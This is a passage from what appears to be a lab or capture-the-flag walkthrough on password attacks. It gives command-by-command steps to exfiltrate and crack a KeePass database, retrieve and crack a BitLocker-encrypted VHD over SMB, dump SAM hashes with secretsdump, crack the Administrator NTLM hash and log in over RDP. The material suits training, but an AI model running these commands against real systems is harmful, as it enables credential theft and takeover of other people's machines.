      PS C:\Users\johanna> [Convert]::ToBase64String((Get-Content -path "C:\Users\johanna\Documents\Logins.kdbx" -Encoding byte))
      ```

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

* on our linux system
  * obtain the encoded file
    * `echo A9mimmf7S...L0= | base64 -d > Logins.kdbx`

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* keepass2john to crack logins
  * `/usr/share/john/keepass2john Logins.kdbx > kdbx.hash`
  * `john --wordlist=mut%password.list kdbx.hash`
    * we obtained PW
* open Keepass w obtained PW to get creds for David

David

* `smbclient -U david \\\\10.129.202.222\\david`
  * ls
  * get Backup.vhd

Attack bitlocker vhd file

* `bitlocker2john -i Backup.vhd > backup.hashes`
* `grep "bitlocker\$0" backup.hashes > backup.hash`
* `hashcat -m 22100 backup.hash mut%password.list -o backup.cracked`
  * we obtained backup PW

Open VHD

* `sudo modprobe nbd`
* `sudo apt install qemu-utils`
* `sudo qemu-nbd -c /dev/nbd0 Backup.vhd`
* `sudo cryptsetup bitlkOpen /dev/nbd0p2 /dev/nbd0p2 backup`
* `sudo mkdir /mnt/mydrive`
* `sudo mount /dev/mapper/backup /mnt/mydrive`
  *   we discovered two files - dumps from the Win SAM DB

      * SAM
      * SYSTEM



Attack SAM

*

    ```
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
    ```
* we retrieved NTLM hash for Administrator account
* hashcat
  *

      ```
      sudo hashcat -m 1000 e53d4d912d96874e83429886c7bf22a1 mut_password.list
      ```

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

*   we obtained PW for admin

    * connect via RDP

    <figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

    * flag.txt
